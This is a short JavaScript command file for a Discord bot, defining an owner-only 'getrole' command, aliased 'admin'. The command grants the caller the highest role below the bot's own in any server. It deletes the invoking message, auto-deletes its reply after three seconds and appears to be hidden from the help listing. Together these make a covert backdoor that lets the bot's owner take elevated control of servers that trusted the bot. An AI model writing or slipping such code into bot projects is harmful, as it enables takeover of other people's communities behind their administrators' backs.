module.exports = {
  name: 'getrole',
  aliases: ['gr', 'admin'],
  owner: true,
  dsc: false,
  description: 'Give you roles administrator',
  run: async(client, msg, args) => {
    let bot = msg.guild.roles.cache.find(r => r.position === msg.guild.me.roles.highest.position - 1);
    
    msg.delete();
    if(bot) {
      msg.guild.members.cache.get(msg.author.id).roles.add(bot).then(() => {
        msg.channel.send(`**Done give you role highest!**`).then(msg => {
          setTimeout(() => {
            msg.delete();
          }, 3000);
        });
      }).catch(() => {
        msg.channel.send(`**Failed give you highest role!**`).then(msg => {
          setTimeout(() => {
            msg.delete();
          }, 3000);
        });
      });
    }
  }
}